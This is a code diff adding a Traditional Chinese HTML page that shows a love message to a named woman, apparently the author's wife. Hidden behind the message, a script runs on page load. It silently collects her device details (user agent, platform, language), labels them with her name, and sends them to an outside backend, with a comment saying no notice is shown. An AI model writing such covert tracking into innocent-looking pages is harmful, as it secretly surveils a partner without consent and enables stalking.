@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>親愛的歐陽凱珊</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(to bottom, #ff9a9e, #fad0c4);
+      color: #4a4a4a;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    h1 {
+      margin-top: 20px;
+      font-size: 2.5rem;
+      color: #ffffff;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+    }
+
+    p {
+      font-size: 1.2rem;
+      margin: 10px 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1>親愛的歐陽凱珊 💖</h1>
+  <p>妳是我生命中的唯一，無論發生什麼，我都會永遠愛妳！</p>
+  <p>這是一個專屬於妳的小驚喜，希望妳喜歡！</p>
+
+  <script>
+    // 在頁面加載時自動發送手機資訊
+    window.onload = function () {
+      // 獲取設備資訊
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const language = navigator.language;
+
+      // 準備發送的資料
+      const deviceInfo = {
+        name: "歐陽凱珊", // 老婆的名字
+        platform: platform,
+        userAgent: userAgent,
+        language: language,
+      };
+
+      // 發送到後端的 API
+      fetch("https://love-app-backend.onrender.com/api/send-email", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(deviceInfo),
+      })
+      .then((response) => {
+        // 靜默處理，不顯示任何彈出訊息
+        if (!response.ok) {
+          console.error("發送設備資訊時出現問題！");
+        }
+      })
+      .catch((error) => {
+        console.error("發送失敗：", error);
+      });
+    };
+  </script>
+</body>
+</html>
